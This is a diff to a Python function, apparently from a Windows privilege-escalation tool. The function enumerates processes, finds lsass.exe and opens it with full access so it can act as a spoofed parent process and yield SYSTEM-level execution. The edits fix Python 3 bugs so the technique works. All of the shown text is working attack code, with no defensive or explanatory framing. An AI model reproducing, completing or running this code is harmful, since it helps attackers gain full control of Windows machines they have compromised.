@@ -49,7 +49,7 @@ def elevate_handle_inheritance(payload):
 		CloseHandle(hToken)
 		
 		while True:
-			DWORD_array = (DWORD *  0xFFFF)
+			DWORD_array = (DWORD * 0xFFFF)
 			ProcessIds = DWORD_array()
 			ProcessIdsSize = sizeof(ProcessIds)
 			BytesReturned = DWORD()
@@ -57,7 +57,7 @@ def elevate_handle_inheritance(payload):
 				if BytesReturned.value < ProcessIdsSize:
 					break
 
-		RunningProcesses = BytesReturned.value / sizeof(DWORD)
+		RunningProcesses = int(BytesReturned.value / sizeof(DWORD))
 		for process in range(RunningProcesses):
 			ProcessId = ProcessIds[process]
 			hProcess = OpenProcess(0x1000, False, ProcessId)
@@ -65,14 +65,16 @@ def elevate_handle_inheritance(payload):
 				ImageFileName = (c_char * MAX_PATH)()
 				if GetProcessImageFileName(hProcess, ImageFileName, MAX_PATH) > 0: 
 					filename = os.path.basename(ImageFileName.value)
-					systemprocess = "lsass.exe"
+					systemprocess = b"lsass.exe"
 					if filename == systemprocess:
 						pid = ProcessId
 						print_info("Found {} to act as PROC_THREAD_ATTRIBUTE_PARENT_PROCESS".format(systemprocess))
 						print_info("PID of our to be parent process: {}".format(ProcessId))
+						break
+
 			CloseHandle(hProcess)
 
-		handle = OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
+		handle = OpenProcess(PROCESS_ALL_ACCESS, False, int(ProcessId))
 		if handle == 0:
 			print_error("Error in OpenProcess: {}".format(GetLastError()))
 
